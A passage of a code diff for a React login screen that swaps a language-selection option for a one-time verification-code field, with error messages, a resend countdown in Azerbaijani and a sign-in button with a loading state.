+                  className={`bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border transition-all ${
+                    otpError
+                      ? "border-red-500 bg-red-50/20 ring-2 ring-red-500/20"
+                      : "border-gray-100 focus-within:ring-2 focus-within:ring-[#E31E24]/30"
+                  }`}
+                >
+                  <Lock className="w-5 h-5 text-gray-300 flex-shrink-0" />
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    value={otp}
+                    onChange={(e) => {
+                      setOtp(e.target.value.replace(/\D/g, ""))
+                      if (otpError) setOtpError(null)
+                    }}
+                    placeholder="Enter verification code"
+                    className="bg-transparent border-none outline-none text-xl font-bold tracking-widest text-gray-900 placeholder:text-gray-300 placeholder:text-sm placeholder:font-normal w-full"
+                  />
+                </div>
+
+                {/* Error Message */}
+                {otpError && (
+                  <p className="text-xs font-semibold text-red-600 px-1 flex items-center gap-1.5 animate-slide-up">
+                    <AlertCircle className="w-4 h-4 text-red-600 flex-shrink-0" />
+                    <span>{otpError}</span>
+                  </p>
+                )}
+              </div>
+
+              {/* Resend Timer */}
+              <div className="text-sm font-medium text-gray-400 px-1 pt-1 flex items-center gap-2">
+                {timer > 0 ? (
+                  <span>
+                    Kodu yenidən göndər: <strong className="text-gray-900 font-bold">{formatTimer(timer)}</strong>
+                  </span>
+                ) : (
+                  <button
+                    onClick={() => {
+                      setTimer(60)
+                      setOtpError(null)
+                    }}
+                    className="text-sm font-bold text-[#E31E24] hover:underline cursor-pointer"
+                  >
+                    Yenidən göndər
+                  </button>
+                )}
+              </div>
+            </div>
+
+            {/* Bottom Verify Button */}
+            <div className="pt-6 pb-2 w-full">
               <button
                 type="button"
-                onClick={() => {
-                  setSelectedLang("en")
-                  setIsLangModalOpen(false)
-                }}
-                className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all cursor-pointer text-left ${
-                  selectedLang === "en"
-                    ? "bg-[#2272FF]/10 border-[#2272FF] shadow-xs"
-                    : "bg-[#f8fafc] border-gray-100 hover:bg-gray-100/70"
+                disabled={!isOtpValid || loading}
+                onClick={handleVerifyOtp}
+                className={`w-full py-3.5 font-semibold text-base rounded-2xl transition-all flex items-center justify-center gap-2 ${
+                  isOtpValid && !loading
+                    ? "bg-[#E31E24] hover:bg-[#c9181d] active:scale-[0.99] text-white shadow-md shadow-red-500/20 cursor-pointer"
+                    : "bg-[#E31E24] opacity-80 text-white cursor-pointer"
                 }`}
               >
-                <div className="flex items-center gap-3.5">
-                  <UKFlag className="w-7 h-7" />
-                  <span className="text-base font-semibold text-gray-900">
-                    English
-                  </span>
-                </div>
-                {selectedLang === "en" && (
-                  <div className="w-6 h-6 rounded-full bg-[#2272FF] flex items-center justify-center text-white">
-                    <Check className="w-3.5 h-3.5 stroke-[3]" />
+                {loading ? (
+                  <div className="flex items-center gap-2">
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                    <span>Təsdiq edilir...</span>
                   </div>
+                ) : (
+                  <span>Sign-in</span>
                 )}
               </button>
             </div>
           </div>
-        </>
-      )}
+        )}
+
+      </div>
     </div>
   )
 }
